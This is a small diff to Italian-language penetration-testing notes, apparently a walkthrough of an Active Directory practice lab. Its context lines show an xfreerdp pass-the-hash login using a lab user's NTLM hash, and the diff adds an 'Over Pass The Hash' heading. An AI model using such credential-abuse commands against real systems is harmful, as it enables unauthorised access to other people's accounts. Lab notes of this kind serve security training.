@@ -282,3 +282,4 @@ Poi entra con xfreerdp
 ```bash
 xfreerdp /u:catelyn.stark /d:north.sevenkingdoms.local /pth:cba36eccfd9d949c73bc73715364aff5 /v:192.168.56.11
 ```
+*Over Pass The Hash (NT -> TGT -> auth)*
